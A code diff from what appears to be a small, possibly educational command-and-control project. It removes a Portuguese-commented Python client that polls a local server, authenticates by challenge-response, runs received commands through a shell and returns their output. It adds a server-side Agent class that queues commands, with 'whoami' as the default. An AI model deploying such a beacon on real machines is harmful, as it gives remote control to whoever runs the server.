@@ -1,132 +1,78 @@
-import http.client
-import re
-import time
-import subprocess
-
-host = "127.0.0.1:80"
-delay = 2
-command_wait_timeout = 30
-
-token = ""
-ordem = ""
-saida = ""
+import uuid
+from datetime import datetime
 
 
-def reinicia():
-    global token, ordem, saida
+class Agent:
 
-    print("Reset!")
+    _default_command = "whoami"
 
-    token = ""
-    ordem = ""
-    saida = ""
+    @classmethod
+    def set_default_command(cls, command):
+        cls._default_command = command
 
+    @classmethod
+    def _get_default_command(cls):
+        return cls._default_command
 
-def comunica(data):
-    global token
+    def __init__(self, ip):
+        self._token = str(uuid.uuid4())
+        self._ip = ip
+        self._lastCommunication = datetime.now()
 
-    try:
-        conn = http.client.HTTPConnection(host)
-        conn.request("POST", "/", data.encode(), headers={"token": token})
-        response = conn.getresponse()
-        body = response.read().decode()
-        if response.status != 200 or body == "False":
-            reinicia()
-        return body
-    except:
-        reinicia()
-        return ""
+        self._nextCommand = self._get_default_command()
+        self._lastResponse = ""
+        self._lastCommand = ""
 
+    def update_last_communication(self):
+        self.last_communication = datetime.now()
 
-def autentica():
-    global token
+    def command_request(self):
+        if self.next_command:
+            self.update_last_communication()
+            self.last_command = self.next_command
+            self.next_command = ""
+            return self.last_command
+        return self._nextCommand
 
-    print("Tentando autenticação...")
-    resposta = comunica("hi")
-    if not re.match(r"[0-9]{10}$", resposta):
-        print("Falha ao comunicar-se")
-        return False
+    # Getters
+    @property
+    def token(self):
+        return self._token
 
-    print(f"Desafio recebido: {resposta}")
+    @property
+    def ip(self):
+        return self._ip
 
-    resposta = (int(resposta) // 100) * 100
+    @property
+    def last_communication(self):
+        return self._lastCommunication
 
-    print(f"Enviando resposta: {resposta}")
+    @property
+    def next_command(self):
+        return self._nextCommand
 
-    resposta = comunica(str(resposta))
+    @property
+    def last_response(self):
+        return self._lastResponse
 
-    if not re.match(
-        r"[a-f0-9]{8}-?[a-f0-9]{4}-?4[a-f0-9]{3}-?[89ab][a-f0-9]{3}-?[a-f0-9]{12}$",
-        resposta,
-    ):
-        return False
+    @property
+    def last_command(self):
+        return self._lastCommand
 
-    token = resposta
-    print(f"Token recebido! {token}")
+    # Setters
+    @last_response.setter
+    def last_response(self, response):
+        self.update_last_communication()
+        self._lastResponse = response
 
+    @next_command.setter
+    def next_command(self, command):
+        self._nextCommand = command
 
-def apresenta():
-    global ordem
-    comando = comunica("")
-    if comando:
-        print(f"Ordem recebida: {comando}")
-        ordem = comando
+    @last_command.setter
+    def last_command(self, command):
+        self._lastCommand = command
 
-
-def responde():
-    global saida
-    print(f"Respondendo: {saida}")
-    comunica(f"{saida}")
-    saida = ""
-
-
-def executa():
-    global saida, ordem
-
-    print(f"Executando comando: {ordem}")
-
-    try:
-        resultado = subprocess.run(
-            ordem,
-            shell=True,
-            check=True,
-            capture_output=True,
-            text=True,
-            timeout=command_wait_timeout,
-        )
-        saida = resultado.stdout.strip()
-    except subprocess.TimeoutExpired:
-        saida = "Timeout"
-    except subprocess.CalledProcessError as e:
-        saida = (
-            f"Erro (exit code {e.returncode}): {e.stderr.strip() if e.stderr else ''}"
-        )
-    except ValueError as e:
-        print(f"Ocorreu erro durante execução de comando {e}")
-
-    ordem = ""
-
-
-def main():
-    while True:
-        # Delay entre as requisições
-        time.sleep(delay)
-
-        # Estou autenticado?
-        if not token:
-            if not autentica():
-                continue
-
-        # Tenho dados a enviar?
-        if saida:
-            responde()
-
-        # Tenho ordem?
-        if ordem:
-            executa()
-        else:
-            apresenta()
-
-
-if __name__ == "__main__":
-    main()
+    @last_communication.setter
+    def last_communication(self, value):
+        self._lastCommunication = value
